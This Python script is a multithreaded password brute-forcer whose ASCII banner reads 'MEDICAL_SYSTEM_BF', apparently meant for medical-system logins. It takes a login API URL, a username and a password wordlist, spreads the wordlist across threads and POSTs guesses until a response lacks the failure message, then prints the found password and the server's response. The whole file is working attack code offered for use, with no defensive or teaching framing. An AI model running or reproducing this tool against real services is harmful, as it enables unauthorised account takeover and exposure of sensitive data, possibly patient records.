

def clearer () :
    import os
    import platform
    so = platform.system()
    print(so)
    if so == "Windows" :
        os.system("cls")
    elif so == "Linux" :
        os.system("clear")

#pip3 install colored
#pip3 install requests

from termcolor import colored


clearer()

print(colored("##     ## ######## ########  ####  ######     ###    ##                ######  ##    ##  ######  ######## ######## ##     ##         ########  ######## ","blue"))
print(colored("###   ### ##       ##     ##  ##  ##    ##   ## ##   ##               ##    ##  ##  ##  ##    ##    ##    ##       ###   ###         ##     ## ##       ","blue"))
print(colored("#### #### ##       ##     ##  ##  ##        ##   ##  ##               ##         ####   ##          ##    ##       #### ####         ##     ## ##       ","blue"))
print(colored("## ### ## ######   ##     ##  ##  ##       ##     ## ##                ######     ##     ######     ##    ######   ## ### ##         ########  ######   ","blue"))
print(colored("##     ## ##       ##     ##  ##  ##       ######### ##                     ##    ##          ##    ##    ##       ##     ##         ##     ## ##       ","blue"))
print(colored("##     ## ##       ##     ##  ##  ##    ## ##     ## ##               ##    ##    ##    ##    ##    ##    ##       ##     ##         ##     ## ##       ","blue"))
print(colored("##     ## ######## ########  ####  ######  ##     ## ######## #######  ######     ##     ######     ##    ######## ##     ## ####### ########  ##       ","blue"))


print("\n\n")

API_LOGIN = input("API PATH -> ")
API_USERNAME = input("Username_field_name:value -> ").split(":")
API_PASSWORD = input("Password_field_name:path_file_with_passwords -> ").split(":")
MSG_ERROR = input("Error Message -> ")
THREADS = int(input("Threads -> "))
import requests
file = open(API_PASSWORD[1], "r",encoding='utf-8',errors='ignore')
pwd1 = file.readlines()
passwords = []
for v in pwd1 :
    tmp = v.replace("\n", "")
    passwords.append(tmp)
initer = 0
last = len(passwords)
res = int(len(passwords)/THREADS)
newPasswords = []
for v in range(THREADS) :
    if v < THREADS - 1 :
        newPasswords.append(passwords[initer:initer+res]) 
        initer += res
    elif v == THREADS-1 :
        newPasswords.append(passwords[initer:])
    if initer >= last :
        break
isFinish = [False]
def bf (nPasswords, n) :
        print("Thread #{} started! ".format(n))
        for v in range(len(nPasswords)) :
            if not isFinish[0] :
                #print(n)
                toSend = {API_USERNAME[0]: API_USERNAME[1], API_PASSWORD[0]:nPasswords[v]}
                response = requests.post(API_LOGIN, data=toSend)
                tmp = response.content.decode("utf-8") 
                if (response.status_code == 200 and not MSG_ERROR in tmp) :
                    print("\n\n")
                    print(colored("Password -> {}".format(nPasswords[v], "green")))
                    print("\n\n")
                    print("\n\n")
                    print("\n\n")
                    print(colored(response.content.decode("utf-8") , "green"))
                    isFinish[0] = True
                    return
        
        if isFinish[0] != True :
            print(colored("No hack on Thread #{}".format(n), "red"))
import threading
for v in range(len(newPasswords)) :
    x = threading.Thread(target=bf, args=(newPasswords[v], v,))
    x.start()

print("\n\n")
